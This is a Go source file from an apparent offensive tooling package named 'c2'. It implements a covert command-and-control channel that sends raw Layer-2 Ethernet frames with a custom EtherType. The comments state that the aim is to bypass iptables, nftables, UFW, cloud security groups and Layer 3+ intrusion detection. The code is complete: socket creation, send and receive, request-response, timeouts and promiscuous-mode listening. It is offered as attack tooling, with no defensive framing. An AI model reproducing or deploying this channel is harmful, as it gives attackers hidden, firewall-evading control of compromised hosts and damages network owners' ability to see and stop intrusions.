package c2

// AF_PACKET Raw L2 C2 Channel — Sub-Firewall Communication
//
// OPSEC rationale: AF_PACKET sockets operate at Layer 2 (Ethernet frame level).
// Traffic sent/received through them COMPLETELY BYPASSES iptables/nftables
// because netfilter hooks into Layer 3 (IP) and above. No firewall rule —
// INPUT, OUTPUT, or FORWARD — can block or even see our frames.
//
// We use a custom EtherType (0x88B5, IEEE 802.1 Local Experimental 1) so
// our frames never enter the kernel IP stack at all. They exist only as
// raw Ethernet frames between two AF_PACKET sockets on the same L2 segment.
//
// This defeats: iptables, nftables, firewalld, UFW, cloud security groups
// (when on the same L2 segment), any Layer 3+ IDS.
//
// Detection surface:
//   - Raw packet capture (tcpdump -i eth0 ether proto 0x88b5) would see frames
//   - eBPF XDP programs attached to the NIC see everything
//   - Requires same L2 network segment (no routing across subnets)
//
// Capability required: CAP_NET_RAW

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"syscall"
	"unsafe"
)

// Custom EtherType for our L2 channel.
// 0x88B5 is IEEE 802.1 "Local Experimental Ethertype 1" — legitimate for
// local testing and unlikely to trigger alerts. Alternative: 0x88B6 (Exp 2).
const l2EtherType = 0x88B5

// Maximum Ethernet payload (MTU 1500 minus no IP/TCP headers = full 1500).
const l2MaxPayload = 1500

// L2Channel provides a raw Ethernet frame C2 channel.
type L2Channel struct {
	fd      int
	ifIndex int
	ifName  string
	srcMAC  net.HardwareAddr
	dstMAC  net.HardwareAddr
	sendMu  sync.Mutex
	recvMu  sync.Mutex
	recvBuf []byte
	ethType uint16
}

// L2Config controls the raw L2 channel behavior.
type L2Config struct {
	Interface string           // Network interface name (e.g., "eth0")
	DstMAC    net.HardwareAddr // Destination MAC address (C2 server's MAC)
	EtherType uint16           // Custom EtherType (default: 0x88B5)
}

// NewL2Channel creates a raw AF_PACKET socket bound to a specific interface.
func NewL2Channel(cfg *L2Config) (*L2Channel, error) {
	if cfg == nil {
		return nil, fmt.Errorf("L2Config required")
	}

	ethType := cfg.EtherType
	if ethType == 0 {
		ethType = l2EtherType
	}

	// Resolve interface
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface %s: %v", cfg.Interface, err)
	}

	// Create AF_PACKET socket with our custom EtherType filter.
	// Only frames with matching EtherType are delivered to this socket.
	fd, err := syscall.Socket(
		syscall.AF_PACKET,
		syscall.SOCK_RAW,
		int(htons(ethType)),
	)
	if err != nil {
		return nil, fmt.Errorf("socket AF_PACKET: %v", err)
	}

	// Bind to specific interface (required for send)
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(ethType),
		Ifindex:  iface.Index,
	}
	if err := syscall.Bind(fd, &addr); err != nil {
		syscall.Close(fd)
		return nil, fmt.Errorf("bind: %v", err)
	}

	ch := &L2Channel{
		fd:      fd,
		ifIndex: iface.Index,
		ifName:  iface.Name,
		srcMAC:  iface.HardwareAddr,
		dstMAC:  cfg.DstMAC,
		recvBuf: make([]byte, 14+l2MaxPayload), // ethernet header + payload
		ethType: ethType,
	}

	return ch, nil
}

// Send transmits a raw Ethernet frame with the given payload.
// The frame bypasses all netfilter/iptables processing.
func (ch *L2Channel) Send(payload []byte) error {
	if len(payload) > l2MaxPayload {
		return fmt.Errorf("payload too large: %d > %d", len(payload), l2MaxPayload)
	}

	// Build Ethernet frame: dst(6) + src(6) + ethertype(2) + payload
	frame := make([]byte, 14+len(payload))
	copy(frame[0:6], ch.dstMAC)
	copy(frame[6:12], ch.srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], ch.ethType)
	copy(frame[14:], payload)

	// Send via raw socket — bypasses iptables entirely
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(ch.ethType),
		Ifindex:  ch.ifIndex,
		Halen:    uint8(len(ch.dstMAC)),
	}
	copy(addr.Addr[:], ch.dstMAC)

	ch.sendMu.Lock()
	defer ch.sendMu.Unlock()

	if ch.fd < 0 {
		return fmt.Errorf("channel closed")
	}

	return syscall.Sendto(ch.fd, frame, 0, &addr)
}

// Recv receives the next Ethernet frame and returns the payload (without header).
// Blocks until a frame arrives or the socket is closed.
func (ch *L2Channel) Recv() ([]byte, net.HardwareAddr, error) {
	ch.recvMu.Lock()
	defer ch.recvMu.Unlock()

	if ch.fd < 0 {
		return nil, nil, fmt.Errorf("channel closed")
	}

	n, from, err := syscall.Recvfrom(ch.fd, ch.recvBuf, 0)
	if err != nil {
		return nil, nil, err
	}

	if n < 14 {
		return nil, nil, fmt.Errorf("runt frame: %d bytes", n)
	}

	// Extract source MAC from the frame header
	srcMAC := make(net.HardwareAddr, 6)
	copy(srcMAC, ch.recvBuf[6:12])

	// Verify EtherType (kernel filter should handle this, but double-check)
	frameType := binary.BigEndian.Uint16(ch.recvBuf[12:14])
	if frameType != ch.ethType {
		return nil, nil, fmt.Errorf("wrong ethertype: 0x%04x", frameType)
	}

	// Return payload only (strip 14-byte Ethernet header)
	payload := make([]byte, n-14)
	copy(payload, ch.recvBuf[14:n])

	_ = from // sockaddr contains link-layer info we already extracted

	return payload, srcMAC, nil
}

// SendRecv sends a payload and waits for a response. Simple request-response pattern.
func (ch *L2Channel) SendRecv(payload []byte) ([]byte, error) {
	if err := ch.Send(payload); err != nil {
		return nil, fmt.Errorf("send: %w", err)
	}

	resp, _, err := ch.Recv()
	if err != nil {
		return nil, fmt.Errorf("recv: %w", err)
	}

	return resp, nil
}

// Close shuts down the L2 channel.
// Only acquires sendMu (not recvMu) to avoid deadlock when Recv is blocked
// in Recvfrom. Closing the fd causes blocked Recvfrom to return EBADF,
// which unblocks Recv naturally.
func (ch *L2Channel) Close() error {
	ch.sendMu.Lock()
	defer ch.sendMu.Unlock()

	if ch.fd >= 0 {
		err := syscall.Close(ch.fd)
		ch.fd = -1
		return err
	}
	return nil
}

// SetRecvTimeout sets a receive timeout on the socket.
func (ch *L2Channel) SetRecvTimeout(seconds int, useconds int) error {
	ch.sendMu.Lock()
	defer ch.sendMu.Unlock()
	if ch.fd < 0 {
		return fmt.Errorf("channel closed")
	}
	tv := syscall.Timeval{
		Sec:  int64(seconds),
		Usec: int64(useconds),
	}
	_, _, errno := syscall.Syscall6(
		syscall.SYS_SETSOCKOPT,
		uintptr(ch.fd),
		syscall.SOL_SOCKET,
		syscall.SO_RCVTIMEO,
		uintptr(unsafe.Pointer(&tv)),
		unsafe.Sizeof(tv),
		0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

// SetPromiscuous enables or disables promiscuous mode on the bound interface.
// In promiscuous mode we see ALL frames, not just those addressed to our MAC.
// Useful for passive listening or when the C2 server uses broadcast/multicast.
func (ch *L2Channel) SetPromiscuous(enable bool) error {
	ch.sendMu.Lock()
	defer ch.sendMu.Unlock()
	if ch.fd < 0 {
		return fmt.Errorf("channel closed")
	}
	mreq := packetMreq{
		ifindex: int32(ch.ifIndex),
		typ:     1, // PACKET_MR_PROMISC
	}
	action := syscall.SYS_SETSOCKOPT
	optVal := uintptr(1) // PACKET_ADD_MEMBERSHIP
	if !enable {
		optVal = 2 // PACKET_DROP_MEMBERSHIP
	}
	_, _, errno := syscall.Syscall6(
		uintptr(action),
		uintptr(ch.fd),
		syscall.SOL_PACKET,
		optVal,
		uintptr(unsafe.Pointer(&mreq)),
		unsafe.Sizeof(mreq),
		0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

type packetMreq struct {
	ifindex int32
	typ     uint16
	alen    uint16
	addr    [8]byte
}

// L2Available checks if AF_PACKET sockets are available (requires CAP_NET_RAW).
func L2Available() bool {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(l2EtherType)))
	if err != nil {
		return false
	}
	syscall.Close(fd)
	return true
}

// htons converts a uint16 from host to network byte order.
func htons(v uint16) uint16 {
	return (v << 8) | (v >> 8)
}
